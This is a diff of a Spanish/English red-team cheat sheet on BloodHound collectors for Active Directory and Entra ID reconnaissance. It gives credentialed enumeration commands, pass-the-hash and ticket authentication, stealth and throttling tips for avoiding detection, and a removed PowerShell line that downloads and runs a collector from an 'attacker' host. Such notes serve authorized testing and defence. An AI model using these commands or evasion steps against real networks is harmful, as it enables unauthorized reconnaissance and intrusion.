@@ -22,357 +22,156 @@ linked:
 
 ## SharpHound (Default Windows)
 
-| **Comando** | **Función** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `SharpHound.exe -c Default` | Standard collection | Standard. |
-| `SharpHound.exe -c All` | Comprehensive | Slow. |
-| `SharpHound.exe -c DCOnly` | DC-only (stealth) | OPSEC. |
-| `SharpHound.exe -c ACL,Group,LocalAdmin,Session` | Targeted | Standard. |
-| `SharpHound.exe -c All --ZipFileName output.zip` | Custom output name | Standard. |
-| `SharpHound.exe -d dom.local` | Specific domain | Standard. |
-| `SharpHound.exe --DomainController DC` | Specific DC | Adjacent. |
-| `SharpHound.exe --LdapUsername user --LdapPassword pass` | Auth creds | Standard. |
-| `SharpHound.exe --LoopDuration 24h --LoopInterval 30m` | Continuous sessions | Standard. |
-| `SharpHound.exe --Stealth` | Stealth mode | OPSEC. |
-| `SharpHound.exe --ExcludeDCs` | Skip DCs | OPSEC. |
-| `SharpHound.exe --SkipPortCheck` | No port pre-check | OPSEC. |
-| `SharpHound.exe --PrettyPrint` | Pretty JSON | Adjacent. |
-| `SharpHound.exe --OutputDirectory C:\loot` | Save location | Standard. |
-| `SharpHound.exe --RandomFilenames` | OPSEC | Stealth. |
-| Modern: in-memory PowerShell load | Defender evasion | Adjacent. |
+| `SharpHound.exe -c All` | Comprehensive collection | Standard. |
+| `SharpHound.exe -c Default` | Default (sessions, ACLs, group, trusts) | Quick. |
+| `SharpHound.exe -c DCOnly` | Solo DC-side data (no per-host queries) | Stealth máximo. |
+| `SharpHound.exe -c All --Stealth` | Reduce noise (LDAP only para algunas operaciones) | OPSEC. |
+| `SharpHound.exe -c All --OutputDirectory C:\loot --ZipFileName collection.zip` | Output custom path | Standard. |
+| `SharpHound.exe -c All --Domain corp.local --LdapUsername u --LdapPassword pass` | Auth explícita | Cross-domain. |
+| `SharpHound.exe -c All --DomainController dc01.corp.local` | DC específico | Targeted. |
+| `SharpHound.exe -c All -Loop --LoopDuration 24:00:00 --LoopInterval 00:30:00` | Loop mode (sessions over time) | Long-term. |
 ^ad-bh-sharphound
 
-### SharpHound recipes
-
 ```cmd
-:: Default collection
-SharpHound.exe -c Default
+:: Pipeline standard
+.\SharpHound.exe -c Default --OutputDirectory C:\loot --ZipFileName corp.zip
 
-:: Stealth (DC-only, fewer hosts queried)
-SharpHound.exe -c DCOnly --Stealth
-
-:: Targeted ACL focus
-SharpHound.exe -c ACL,Group,LocalAdmin,Session
-
-:: All with custom output
-SharpHound.exe -c All --OutputDirectory C:\loot --ZipFileName domain_audit.zip
-
-:: Continuous sessions (24h)
-SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m
-
-:: Cross-domain
-SharpHound.exe -c All -d childdomain.dom.local
-```
-
-```powershell
-# In-memory load (defender evasion)
-IEX (New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1')
-Invoke-BloodHound -CollectionMethod All
+:: Stealth
+.\SharpHound.exe -c DCOnly --OutputDirectory C:\loot
 ```
 
 ___
 
 ## SharpHound Collection Methods
 
-| **Method** | **Detail** | **Notas** |
+| **Method** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Default` | Group, ACL, Session, Trust, ObjectProps, LocalAdmin, SPNTargets | Comprehensive. |
-| `All` | Default + Container, RDP, DCOnly, GPOLocalGroup | Slowest. |
-| `DCOnly` | DC-side only (LDAP queries) | Stealthier. |
-| `Group` | Group memberships | Adjacent. |
-| `ACL` | DACL on objects | Critical. |
-| `Session` | Per-host logged-on users | Lateral. |
-| `Trust` | Domain trusts | Standard. |
-| `ObjectProps` | Object properties | Standard. |
-| `LocalAdmin` | Local admin per host | Lateral. |
-| `RDP` | RDP access per host | Lateral. |
-| `Container` | OU + GPO links | Standard. |
-| `GPOLocalGroup` | GPO-controlled local groups | Adjacent. |
-| `LoggedOn` | Logged-on users per host | Lateral. |
-| `SPNTargets` | SPN-bound users (Kerberoast) | Adjacent. |
-| `CertServices` | ADCS data (BHCE 5.x+) | Modern. |
-| Modern: BHCE 6.x improved | Standard | Tool. |
+| `Default` | Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container | Standard. |
+| `All` | Default + GPOLocalGroup, LoggedOn (per-host queries) | Comprehensive. |
+| `DCOnly` | LDAP-only (no SMB queries per-host) | Stealth. |
+| `Group` | Group memberships only | Targeted. |
+| `LocalAdmin` | Local Administrators per-host | Lateral focus. |
+| `Session` | Active sessions per-host | Pivot focus. |
+| `LoggedOn` | Real-time logged-on users (priv) | Tier discovery. |
+| `Trusts` | Domain trusts | Cross-domain. |
+| `ACL` | DACL forest-wide | Privesc planning. |
+| `ObjectProps` | Object metadata | Detail. |
+| `Container` | Container hierarchy | Standard. |
+| `GPOLocalGroup` | GPO local group settings | GPO abuse. |
+| `SPNTargets` | Kerberoastable SPNs | Pre-attack. |
+| `CertServices` | ADCS templates + CAs (BHCE 5.x+) | ADCS audit. |
 ^ad-bh-methods
 
 ___
 
-## RustHound (Linux + Cross-Platform)
+## RustHound (Cross-Platform)
 
-| **Comando** | **Función** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `rusthound -d dom.local -u user -p pass --zip` | Default | Standard. |
-| `rusthound --domain dom.local --username user --password pass --zip` | Long flags | Adjacent. |
-| `rusthound -d dom.local -u user -p pass --ldapfqdn DC` | Specific DC | Adjacent. |
-| `rusthound -d dom.local -u user -p pass -k` | Kerberos auth | Modern. |
-| `-z, --zip` | Output ZIP | Standard. |
-| `-o output_dir` | Output directory | Adjacent. |
-| Faster than SharpHound (Rust binary) | Performance | Standard. |
-| Cross-platform (Linux + Windows) | Standard | Standard. |
-| Modern Rust implementation | Modern | Tool. |
-| Less mature than SharpHound | Adjacent | Edge. |
-| Some collection methods differ | Per-version | Edge. |
-| BHCE compatible output | Standard | Tool. |
-| Detection: less signatures | Edge | OPSEC. |
-| Modern: emerging alternative | Standard | Tool. |
-| Cross-domain support | Standard | Adjacent. |
-| Compliance: red team scoped | Standard | OPSEC. |
+| `rusthound -d corp.local -u u@corp.local -p pass --zip` | Standard collection | Cross-platform fast. |
+| `rusthound -d corp.local -u u@corp.local -p pass --zip -o ./loot/` | Output custom | Standard. |
+| `rusthound -d corp.local -u u@corp.local -p pass --ldapfqdn dc01.corp.local --zip` | DC explícito | Targeted. |
+| `rusthound -d corp.local -u u@corp.local -p pass --ldaps --zip` | LDAPS encrypted | OPSEC. |
 ^ad-bh-rusthound
 
-### RustHound recipes
-
-```bash
-# Default collection
-rusthound -d dom.local -u user@dom.local -p pass --zip
-
-# Specific DC
-rusthound -d dom.local -u user@dom.local -p pass --ldapfqdn dc01.dom.local --zip
-
-# Kerberos auth (TGT-based)
-KRB5CCNAME=user.ccache rusthound -d dom.local -u user@dom.local -k --zip
-
-# Output to custom directory
-rusthound -d dom.local -u user@dom.local -p pass --zip -o ./loot/
-```
+**Por qué RustHound:** Rust performance, single binary cross-platform (Win/Linux/Mac), no .NET dependency. Útil cuando SharpHound es bloqueado por AV.
 
 ___
 
-## BloodHound.py (Python Linux)
+## BloodHound.py (Linux)
 
-| **Comando** | **Función** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `bloodhound-python -d dom.local -u user -p pass -ns DC -c All --zip` | Default | Standard. |
-| `bloodhound-python -d dom.local -u user -p pass -ns DC -c DCOnly` | Stealth | OPSEC. |
-| `-c CollectionMethod` | Specify methods | Standard. |
-| `-c All` | Comprehensive | Slow. |
-| `-c Group,ACL,Session,Trust,LocalAdmin,RDP,Container,GPOLocalGroup` | Targeted | Standard. |
-| `--zip` | Output ZIP | Standard. |
-| `-ns DC-IP` | Name server | Required. |
-| `-d dom.local` | Domain | Required. |
-| `-u user -p pass` | NTLM auth | Standard. |
-| `-k -no-pass` | Kerberos auth | Adjacent. |
-| `-hashes :NT_HASH` | Pass-the-Hash auth | Adjacent. |
-| `-aesKey AES_KEY` | AES key auth | Edge. |
-| Modern: pip install bloodhound | Standard | Standard. |
-| Cross-platform | Standard | Standard. |
-| Adjacent: ldap3 Python lib | Standard | Adjacent. |
-| Detection: bloodhound-python signatures | Defender | Adjacent. |
-| Modern: continuous BHCE | Defender | Standard. |
-| Compliance: red team scoped | Standard | OPSEC. |
+| `bloodhound-python -d corp.local -u u -p pass -ns <DC> -c All --zip` | Standard Linux | Linux. |
+| `bloodhound-python -d corp.local -u u -p pass -ns <DC> -c All --zip -o ./loot/` | Output path | Standard. |
+| `bloodhound-python -d corp.local -u u -p pass -ns <DC> -c DCOnly --zip` | Stealth | OPSEC. |
+| `bloodhound-python -d corp.local -u u -p pass -ns <DC> -c All --zip --auth-method ntlm` | Force NTLM | Sin Kerberos. |
+| `bloodhound-python -d corp.local -u u -p pass -ns <DC> -c All --zip --kerberos` | Kerberos auth | OPSEC. |
+| `bloodhound-python -d corp.local -u u -p pass -ns <DC> -c All --zip --use-ldaps` | LDAPS | Encrypted. |
 ^ad-bh-python
 
-### BloodHound.py recipes
-
 ```bash
-# Install
-pip install bloodhound
-
-# Default collection
-bloodhound-python -d dom.local -u user -p pass -ns DC-IP -c All --zip
-
-# Pass-the-Hash auth
-bloodhound-python -d dom.local -u user -hashes :aad3b435...:NTHASH -ns DC-IP -c All --zip
-
-# Kerberos auth
-KRB5CCNAME=user.ccache bloodhound-python -d dom.local -u user -k -no-pass -ns DC-IP -c All --zip
-
-# Stealth (DCOnly)
-bloodhound-python -d dom.local -u user -p pass -ns DC-IP -c DCOnly --zip
+# Standard Linux pipeline
+pip install bloodhound  # o `apt install bloodhound.py`
+bloodhound-python -d corp.local -u auditor -p 'Pass!' -ns 10.10.10.10 -c All --zip -o ./loot/
 ```
 
 ___
 
 ## AzureHound (Cloud)
 
-| **Comando** | **Función** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `azurehound list users` | All Azure AD users | Standard. |
-| `azurehound list groups` | All Azure AD groups | Standard. |
-| `azurehound -u user -p pass -t tenant_id list` | Auth via password | Standard. |
-| `azurehound --refresh-token TOKEN -t tenant_id list` | Refresh token | Adjacent. |
-| `azurehound --client-id ID --client-secret SECRET -t tenant_id list` | App registration | Adjacent. |
-| Output: JSON for BHCE ingest | Standard | Tool. |
-| Hybrid identity (on-prem + Azure AD) | Adjacent | Adjacent. |
-| Cross-correlate with on-prem AD | Standard | Audit. |
-| Modern: BHCE 6.x Azure support | Modern | Tool. |
-| Detection: AzureHound API events | Defender | Adjacent. |
-| Microsoft Defender for Cloud Apps adjacent | Modern | Defender. |
-| Compliance: red team scoped | Standard | OPSEC. |
-| Adjacent: Azure AD attacks | Cross-ref | Adjacent. |
-| Modern: emerging cloud focus | Standard | Tool. |
-| Audit baseline | Standard | Compliance. |
-| Cross-correlate with hybrid | Standard | Audit. |
+| `azurehound list -u u@tenant.onmicrosoft.com -p pass -t <tenant-id> -o azure.json` | Entra ID dump | Cloud. |
+| `azurehound list -u u@tenant.onmicrosoft.com -p pass -t <tenant-id> --refresh-token <RT> -o azure.json` | Auth con refresh token | Token-based. |
+| `azurehound list -u u@tenant.onmicrosoft.com -p pass -t <tenant-id> --service-principal --client-id <id> --client-secret <secret>` | Service Principal auth | OPSEC. |
 ^ad-bh-azurehound
 
-### AzureHound
-
 ```bash
-# Install
-go install github.com/BloodHoundAD/AzureHound@latest
+# Standard cloud collection
+azurehound list -u admin@tenant.onmicrosoft.com -p 'Pass!' -t <tenant-uuid> -o azure.json
 
-# Auth via password
-azurehound -u user@tenant.onmicrosoft.com -p pass -t tenant_id list
-
-# Output to file
-azurehound -u user -p pass -t tenant_id list > azure_data.json
-
-# Or via app registration
-azurehound --client-id <app-id> --client-secret <secret> -t tenant_id list
+# Ingest en BHCE (drag-drop azure.json)
 ```
 
 ___
 
 ## Comparison
 
-| **Aspect** | **SharpHound** | **RustHound** | **BloodHound.py** | **AzureHound** |
+| **Collector** | **Platform** | **Speed** | **Stealth** | **Modern features** |
 |:---:|:---:|:---:|:---:|:---:|
-| Platform | Windows | Cross-platform | Linux/Cross | Cross |
-| Language | C# | Rust | Python | Go |
-| Speed | Standard | Fast | Standard | Standard |
-| Maturity | Most mature | Emerging | Mature | Modern (cloud) |
-| Auth methods | NTLM, Kerberos | NTLM, Kerberos | NTLM, PtH, Kerberos, AES | Azure AD |
-| Detection | EDR signatures | Less signatures | Some signatures | API logs |
-| OPSEC | Standard | Stealthier | Standard | Standard |
-| Modern: BHCE 6.x compat | Standard | Standard | Standard | Modern |
-| ADCS support | Standard | Modern | Modern | N/A |
-| Output | ZIP JSON | ZIP JSON | ZIP JSON | JSON |
-| Loop sessions | Yes | Limited | No | N/A |
+| SharpHound | Windows (.NET) | Slow-medium | Medium | Best (CertServices, modern edges). |
+| RustHound | Cross-platform (binary) | Fast | Medium | Modern (active dev). |
+| BloodHound.py | Linux (Python) | Medium | Medium-high | Modern (active dev). |
+| AzureHound | Cross-platform | Medium | High | Cloud-only. |
 ^ad-bh-comparison
 
 ___
 
 ## Collection OPSEC
 
-| **Aspect** | **Detail** | **Notas** |
+| **Práctica** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| Bulk LDAP queries = SIEM flag | Defender | Adjacent. |
-| DCOnly = stealthier | Edge | OPSEC. |
-| Stealth flag | SharpHound | OPSEC. |
-| Random filenames | OPSEC evasion | Stealth. |
-| In-memory PowerShell load | EDR evasion | Adjacent. |
-| Detection: Event 1644 (LDAP query) | Defender | Adjacent. |
-| Detection: bulk session enumeration | Defender ML | Modern. |
-| Time-of-day pacing | Match legit | Stealth. |
-| Per-engagement scope | Limited collection | OPSEC. |
-| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
-| Modern: BHCE 6.x continuous | Defender side | Adjacent. |
-| Cleanup: collection ZIP cleanup | Post-engagement | OPSEC. |
-| Compliance: red team scoped | Standard | OPSEC. |
-| Adjacent: Hosts Enumeration hub | Cross-ref | Adjacent. |
-| Modern: extreme defender alerting | Critical | Standard. |
-| Cross-correlate with detection | Standard | Audit. |
+| `-c DCOnly` | Sin per-host queries | Stealth máximo. |
+| `--Stealth` (SharpHound) | LDAP-only para session enum | Reduce SMB noise. |
+| `--Throttle 1000` / `--Jitter 50` (SharpHound) | Pacing | Reduce burst rate. |
+| Run desde existing legitimate context | Reduce telemetry signature | OPSEC. |
+| Avoid `-c LoggedOn` (requires admin per-host) | High noise + privilege | Skip si no necesario. |
+| `--ExcludeDomainControllers` | Skip DC enumeration (less critical) | Targeted. |
+| Time-of-day matching | Match legit recon patterns | Stealth. |
 ^ad-bh-opsec
-
-### OPSEC-aware collection
-
-```bash
-# Stealthier (DCOnly)
-bloodhound-python -d dom.local -u user -p pass -ns DC -c DCOnly --zip
-
-# Or RustHound (less signatures)
-rusthound -d dom.local -u user -p pass --zip
-
-# Avoid bulk -c All if possible
-# Per-engagement: scope to needed collection methods only
-```
 
 ___
 
 ## Cross-Domain Collection
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Per-domain SharpHound run | Sequential | Standard. |
-| `SharpHound.exe -d childdomain.dom.local` | Specific | Standard. |
-| Forest-wide via foreach | Standard | Adjacent. |
-| Cross-trust collection | Edge | Adjacent. |
-| Forest root domain | Standard | Standard. |
-| BloodHound.py per-domain | Standard | Standard. |
-| RustHound per-domain | Standard | Standard. |
-| Ingest multiple ZIPs into BHCE | Standard | Tool. |
-| BHCE auto-correlates cross-domain | Modern | Tool. |
-| Cross-correlate trust attributes | Standard | Audit. |
-| Detection: multi-domain queries | Defender | Adjacent. |
-| Modern: BHCE 6.x improved cross-domain | Modern | Tool. |
-| Cypher: cross-domain queries | Custom | Tool. |
-| Adjacent: Trust hub | Cross-ref | Adjacent. |
-| Compliance: documented per-domain | Standard | Adjacent. |
-| OPSEC: per-domain pacing | Stealth | Standard. |
+| `SharpHound.exe -c All -d corp.local; SharpHound.exe -c All -d partner.com` | Run per-domain sequencial | Multi-domain. |
+| `bloodhound-python -d corp.local -c All --zip; bloodhound-python -d partner.com -c All --zip` | Linux multi-domain | Linux. |
+| BHCE 6.x auto-correlate | Drop ZIPs en UI | Modern. |
 ^ad-bh-multidomain
 
-### Multi-domain collection
-
 ```bash
-# Per-domain via BloodHound.py
-for dom in domA.local domB.local domC.local; do
-  bloodhound-python -d $dom -u user@$dom -p pass -ns dc.$dom -c All --zip -o ./loot/$dom/
+# Multi-domain pipeline
+for d in corp.local partner.com vendor.local; do
+  DC=$(dig +short SRV "_ldap._tcp.dc._msdcs.$d" | awk '{print $4}' | head -1 | sed 's/\.$//')
+  bloodhound-python -d "$d" -u "auditor@$d" -p 'Pass!' -ns "$DC" -c All --zip -o "./loot/$d/"
 done
-
-# Ingest all ZIPs into BHCE
-# Drag-and-drop ZIPs into BloodHound CE upload
-```
-
-```cmd
-:: SharpHound per-domain
-SharpHound.exe -d domA.local -c All --OutputDirectory C:\loot\domA\
-SharpHound.exe -d domB.local -c All --OutputDirectory C:\loot\domB\
 ```
 
 ___
 
 ## Continuous Loop Mode
 
-| **Comando** | **Función** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| `SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m` | Continuous sessions | Standard. |
-| `--LoopDuration 24h` | Total duration | Standard. |
-| `--LoopInterval 30m` | Per-loop wait | Standard. |
-| `--LoopFileName loop.zip` | Output | Adjacent. |
-| Use case: capture transient sessions | Catch DA logon | Strategy. |
-| Modern: stealthier than bulk | Edge | OPSEC. |
-| Detection: long-running collection | Defender ML | Modern. |
-| Modern: BHCE auto-ingest sessions | Tool | Adjacent. |
-| OPSEC: per-engagement scope | Standard | OPSEC. |
-| Cross-correlate with priv user logon | Standard | Audit. |
-| Adjacent: Pass-the-Ticket hub | Cross-ref | Adjacent. |
-| Compliance: red team scoped | Standard | OPSEC. |
-| Cleanup: post-engagement | Standard | OPSEC. |
-| Detection: bulk session enum | Defender | Adjacent. |
-| Modern: extreme alerting | Critical | Standard. |
-| Time-of-day pacing | Match legit | Stealth. |
+| `SharpHound.exe -c Session -Loop --LoopDuration 24:00:00 --LoopInterval 00:30:00` | Session collection loop 24h, cada 30min | Long-term enum. |
+| `SharpHound.exe -c LoggedOn -Loop --LoopDuration 12:00:00 --LoopInterval 00:15:00` | Logged-on users loop | Tier-X discovery. |
 ^ad-bh-loop
 
-### Loop session capture
-
-```cmd
-:: Continuous session enumeration (24h, every 30m)
-SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m --OutputDirectory C:\loot
-
-:: Output: multiple ZIPs over time
-:: Ingest all into BHCE for full session graph
-```
-
-___
-
-## Wordlists & Recursos
-
-| **Recurso** | **URL / Path** | **Notas** |
-|:---:|:---:|:---:|
-| BloodHound CE docs | `bloodhound.specterops.io` | Tool docs. |
-| SharpHound docs | `support.bloodhoundenterprise.io` | Tool docs. |
-| BloodHound.py repo | `github.com/dirkjanm/BloodHound.py` | Tool. |
-| RustHound repo | `github.com/OPENCYBER-FR/RustHound` | Tool. |
-| AzureHound repo | `github.com/BloodHoundAD/AzureHound` | Cloud tool. |
-| Specter Ops blog | `posts.specterops.io` | Research. |
-| Compass Security BloodHound queries | `github.com/CompassSecurity/BloodHoundQueries` | Custom queries. |
-| HackTricks BloodHound | `book.hacktricks.xyz` | Reference. |
-| The Hacker Recipes BloodHound | `thehacker.recipes/ad/recon` | Reference. |
-| BloodHound CE 6.x changelog | Modern features | Tool. |
-| `awesome-active-directory` | GitHub | Foundation. |
-| Will Schroeder BloodHound research | Specter Ops | Adversary. |
-| Modern: BHCE Cypher cheatsheet | Tool docs | Reference. |
-| Detection: BloodHound IOCs | Defender | Adjacent. |
-| Compliance: red team scoped | Standard | OPSEC. |
-| Cross-correlate with engagement | Per-engagement | Standard. |
-^ad-bh-resources
+**Por qué:** sessions cambian. Single snapshot = miss many sessions. Loop captura sessions sobre tiempo = mejor visibility de Tier 0 logins.
 
 ***
